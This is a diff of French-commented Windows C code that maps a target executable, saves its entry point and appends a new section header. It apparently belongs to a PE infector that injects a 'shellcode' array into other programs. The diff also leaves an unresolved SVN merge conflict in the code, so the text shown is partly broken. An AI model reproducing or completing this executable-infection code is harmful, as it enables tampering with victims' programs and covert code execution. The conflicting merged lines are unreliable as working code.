@@ -54,14 +54,7 @@ char shellcode[] =
     PIMAGE_NT_HEADERS infosPE;
 
 	// CreateFile -> http://msdn2.microsoft.com/en-us/library/aa363858.aspx
-	/* LPCTSTR lpFileName,
-	__in      DWORD dwDesiredAccess,
-	__in      DWORD dwShareMode,
-	__in_opt  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-	__in      DWORD dwCreationDisposition,
-	__in      DWORD dwFlagsAndAttributes,
-	in_opt  HANDLE hTemplateFile
-	*/
+
 	HANDLE executableHandle = CreateFile(argv[1] , 
 		GENERIC_READ | GENERIC_WRITE , 
 		FILE_SHARE_READ | FILE_SHARE_WRITE ,
@@ -70,28 +63,9 @@ char shellcode[] =
 		FILE_ATTRIBUTE_NORMAL, 
 		NULL) ; 
 	// CreateFileMapping http://msdn.microsoft.com/en-us/library/aa366537(VS.85).aspx
-        /*
-	HANDLE WINAPI CreateFileMapping(
-	__in      HANDLE hFile,
-	__in_opt  LPSECURITY_ATTRIBUTES lpAttributes,
-	__in      DWORD flProtect,
-	__in      DWORD dwMaximumSizeHigh,
-	__in      DWORD dwMaximumSizeLow,
-	__in_opt  LPCTSTR lpName
-	);
-	*/
-	//chris :  surement up la size avec la taille du shell code 
+
 	HANDLE executableMappe = CreateFileMapping(executableHandle , NULL , PAGE_READWRITE , 0  , 0 , NULL) ; 
 
-	/*
-	LPVOID WINAPI MapViewOfFile(
-	__in  HANDLE hFileMappingObject,
-	__in  DWORD dwDesiredAccess,
-	__in  DWORD dwFileOffsetHigh,
-	__in  DWORD dwFileOffsetLow,
-	__in  SIZE_T dwNumberOfBytesToMap
-	);
-	*/
 	
 	LPVOID executableEnMemoire = MapViewOfFile(executableMappe , FILE_MAP_ALL_ACCESS , 0 ,  0, 0); 
 
@@ -123,18 +97,23 @@ char shellcode[] =
     DWORD fileAlignment = infosPE->OptionalHeader.FileAlignment;
     DWORD sauvegardeEntryPoint = infosPE->OptionalHeader.AddressOfEntryPoint;
 
-
-    PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS));
+	//addr infosPe (IMAGE_NT_HEADERS) + sizeof (IMAGE_NT_HEADERS) pointe sur le 1er section_header
+    PIMAGE_SECTION_HEADER infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosPE + sizeof(IMAGE_NT_HEADERS)); 
+    // infosSection += numbersection * sizeof(image_section_header) pointe sur la fin des sectiosn header 
     infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection + ( (sizeof(IMAGE_SECTION_HEADER) ) * (infosPE->FileHeader.NumberOfSections) ) );
 
-
+   // pointe sur le nouvel section header
     PIMAGE_SECTION_HEADER notreSection = (PIMAGE_SECTION_HEADER)(infosSection);
+<<<<<<< .mine
+    infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection - (sizeof(IMAGE_SECTION_HEADER))); //On retrouve l'addr de l'entete précédente pour calculer la vsize et voffset.
+=======
     infosSection = (PIMAGE_SECTION_HEADER)((PUCHAR)infosSection - (sizeof(IMAGE_SECTION_HEADER))); //On retrouve l'addr de l'entete précédent pour calculer la vsize et voffset.
+>>>>>>> .r16
 
     (*pointeurNombreDeSection)++;
     (*pointeurSizeOfImage) += tailleSection;
 
-    char* nomSection = ".newsection"; //7char + \0 => tjrs 8chars.
+    char* nomSection = ".newsec"; //7char + \0 => tjrs 8chars.
 
     strcpy((char*)notreSection->Name,nomSection);
     notreSection->Misc.VirtualSize = AligneSur(sectionAlignment,tailleSection);
